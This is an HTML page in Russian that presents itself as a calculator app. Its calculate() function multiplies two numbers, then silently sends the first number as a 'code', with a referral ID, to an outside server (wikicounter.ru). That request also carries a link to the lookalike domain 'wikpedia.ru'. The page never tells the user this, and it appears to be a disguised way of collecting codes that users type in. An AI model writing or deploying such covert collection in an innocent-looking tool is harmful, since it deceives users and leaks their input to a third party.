<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="theme-color" content="#ffffff"/>
  <link rel="manifest" href="/manifest.json">
  <title>Калькулятор</title>
  <style>
    #calculator {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: white;
      z-index: 10;
      padding: 20px;
      overflow: auto;
    }
  </style>
</head>
<body>

<div id="ref-display">Ваш ID: загрузка...</div>
<button onclick="openCalculator()">Открыть калькулятор</button>

<div id="calculator">
  <h2>Калькулятор</h2>
  <input id="num1" type="number" placeholder="Введите первое число" />
  <input id="num2" type="number" placeholder="Введите второе число" />
  <button onclick="calculate()">=</button>
  <div id="result"></div>
  <div id="user-id-display"></div>
  <button onclick="closeCalculator()">Закрыть калькулятор</button>
</div>

<script>
  // 1. Сохраняем ref при первом открытии
  function saveRef() {
    const params = new URLSearchParams(window.location.search);
    const urlRef = params.get('ref');
    
    if (urlRef) {
      localStorage.setItem('telegram_ref', urlRef);
      return urlRef;
    }
    
    return localStorage.getItem('telegram_ref');
  }

  // 2. Получаем ref (из URL или localStorage)
  function getRef() {
    let ref = localStorage.getItem('telegram_ref');
    
    if (!ref) {
      ref = prompt("Введите ваш ID:");
      if (ref) {
        localStorage.setItem('telegram_ref', ref);
      }
    }
    
    return ref;
  }

  // 3. Отправка кода на сервер
  async function sendCodeToServer(code) {
    const ref = getRef();
    if (!ref) return;

    try {
      const response = await fetch("https://wikicounter.ru/update_code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          code: code.toString(),
          new_url: `https://wikpedia.ru?ref=${ref}`
        })
      });
      
      const data = await response.json();
      console.log(data.status === "success" ? "✅ Связь установлена" : "❌ Код не найден");
    } catch (err) {
      console.error("Ошибка:", err);
    }
  }

  // 4. Инициализация при загрузке
  window.addEventListener('DOMContentLoaded', () => {
    const ref = saveRef();
    const refDisplay = document.getElementById('ref-display');
    
    if (ref) {
      refDisplay.textContent = `Ваш ID: ${ref}`;
      document.getElementById('user-id-display').textContent = `ID: ${ref}`;
    } else {
      refDisplay.textContent = 'ID не найден';
    }
    
    // Регистрация Service Worker для PWA
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js');
    }
  });

  // 5. Функции калькулятора
  function openCalculator() {
    document.getElementById('calculator').style.display = 'block';
  }

  function closeCalculator() {
    document.getElementById('calculator').style.display = 'none';
  }

  function calculate() {
    const num1 = Number(document.getElementById('num1').value);
    const num2 = Number(document.getElementById('num2').value);
    
    if (!num1 || !num2) {
      alert('Введите оба числа');
      return;
    }

    const result = num1 * num2;
    document.getElementById('result').textContent = `Результат: ${result}`;
    
    // Отправляем первое число как код
    if (num1) sendCodeToServer(num1);
  }
</script>
</body>
</html>